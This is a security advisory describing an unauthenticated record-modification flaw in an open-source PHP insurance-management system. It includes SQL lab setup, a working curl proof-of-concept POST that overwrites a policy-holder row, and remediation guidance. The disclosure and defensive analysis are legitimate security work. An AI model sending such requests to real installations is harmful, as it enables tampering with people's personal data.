# TTA-2026-015: Insurance-Management-System allows unauthenticated policy-holder record modification

**Severity: High** — Provisional CVSS 3.1: 7.5 (`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`)

### Title

Missing authentication and authorization in `UpdatePolicyHolder-inc.php` allows unauthenticated modification of policy-holder personal data.

### Summary

The policy-holder update handler processes a submitted `Policy_no` and new field values without starting a session or checking that the requester is an authenticated agent authorized for the policy. A remote caller can directly POST to the backend and overwrite the synthetic policy-holder record.

### Affected Version

- Vendor: dhikshitha29
- Product: Insurance-Management-System
- Affected commit: `125362cc21dca20d74091a4913a5096bb58dd837`
- Affected file: `Insurance_Management_System/Agent/includes/UpdatePolicyHolder-inc.php`
- Fixed version: none known

### Vulnerability Type

Missing Authentication / Missing Authorization (CWE-306, CWE-862; related to CWE-639).

### Affected Code

File: `Agent/includes/UpdatePolicyHolder-inc.php`.

The handler checks only whether the submitted `Policy_no` and `Name` fields are non-empty. It then updates the matching policy-holder row. It does not validate an authenticated session or compare the policy's agency/owner with the caller.

### Root Cause

The application assumes that callers can reach the update handler only through the agent-facing form. The backend endpoint is directly accessible and performs the update without an authentication or per-record authorization check. The caller supplies the record key and replacement personal data.

### Steps to Reproduce

Use a local deployment only. The test below creates and modifies a synthetic row; it must not be run against a production installation.

1. Deploy commit `125362cc21dca20d74091a4913a5096bb58dd837` on PHP 7.x with MySQL or MariaDB. Set `BASE_URL` to the application directory containing `index.php`, for example `http://127.0.0.1/Insurance-Management-System`.
2. The project targets Windows/XAMPP. If testing on Linux or macOS, adjust the test copy's hard-coded database include so `Agent/includes/UpdatePolicyHolder-inc.php` resolves to the local `database.php`.
3. Create the database and synthetic policy-holder table:

   ```sql
   CREATE DATABASE l7;
   USE l7;
   CREATE TABLE Policy_holder (
     Policy_no INT PRIMARY KEY,
     Name VARCHAR(255), Mobile_no VARCHAR(20), Email_id VARCHAR(255),
     City VARCHAR(255), Colony VARCHAR(255), House_no VARCHAR(255),
     Pincode VARCHAR(20), Nominee_name VARCHAR(255),
     Nominee_relation VARCHAR(255), Gender VARCHAR(10),
     Occupation VARCHAR(255), DOB DATE, Edu_ql VARCHAR(255), AGE INT
   );
   INSERT INTO Policy_holder VALUES
   (100000001, 'John Doe', '9000000000', 'john@test.local',
    'Pune', 'Colony A', '12', '411001', 'Jane Doe', 'Spouse',
    'MALE', 'Engineer', '1989-06-15', 'B.E.', 35);
   ```

4. Confirm the starting values:

   ```sql
   SELECT Policy_no, Name, Email_id, City
   FROM Policy_holder WHERE Policy_no = 100000001;
   ```

   Expected baseline: `100000001 | John Doe | john@test.local | Pune`.

5. Start a clean HTTP client with no PHP session cookie. Send the following form POST using only synthetic values:

   ```bash
   curl -sS -i \
     -d 'Policy_no=100000001&Name=LAB-UPDATED&Mobile_no=9000000001&Email_id=updated%40example.test&City=LabCity&Colony=LabColony&House_no=99&Pincode=000000&Nominee_name=LabNominee&Nominee_relation=Other&Gender=MALE&Occupation=LabTester&DOB=1990-01-01&Edu_ql=Test&submit=1' \
     "$BASE_URL/Agent/includes/UpdatePolicyHolder-inc.php" \
     | sed -n '1,25p'
   ```

6. Vulnerable result: the response redirects to a success result (the tested build returned `../ManagePolicy/UpdatePolicy.php?success=PolicyAdded`) despite the absence of a session cookie.
7. Verify the database row:

   ```sql
   SELECT Policy_no, Name, Email_id, City
   FROM Policy_holder WHERE Policy_no = 100000001;
   ```

   Vulnerable result: `100000001 | LAB-UPDATED | updated@example.test | LabCity`.

8. Restore the original synthetic row or drop the disposable test database after the test. Do not use a real policy number or personal data.

### Impact

An unauthenticated caller can overwrite policy-holder personal data, including contact details, address, nominee, and date of birth. The demonstrated operation changes a single synthetic record; the same missing authorization check applies to any record identifier accepted by the handler.

### CVSS

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` — 7.5 High, provisional. The score models unauthorized data modification; the test did not demonstrate direct data disclosure or service availability impact.

## Status

Published as TTA-2026-015. No CVE has been assigned. This is distinct from TTA-2026-005: TTA-2026-005 concerns SQL query manipulation in the policy-holder edit lookup, while this report concerns the update handler's missing authentication and authorization checks.

## Recommended remediation

- Start and validate the session in the update handler itself.
- Check an explicit policy-management permission before loading or changing a record.
- Verify that the policy belongs to an agency or scope the authenticated user is authorized to manage.
- Keep the prepared statement, but do not treat parameterization as a substitute for authentication and authorization.
- Return a denial and terminate processing before any database update if the access check fails.
- Add negative tests for no session, a non-agent session, another agency's policy, and a valid authorized update.

## References

- [Original upstream report](https://github.com/dhikshitha29/Insurance-Management-System/issues/6)
- [Affected handler at the reported commit](https://github.com/dhikshitha29/Insurance-Management-System/blob/125362cc21dca20d74091a4913a5096bb58dd837/Insurance_Management_System/Agent/includes/UpdatePolicyHolder-inc.php)

## Evidence boundary

The reproduction uses a local lab deployment and a synthetic database row. No production host, account, credential, session value, or real personal data is needed or included.
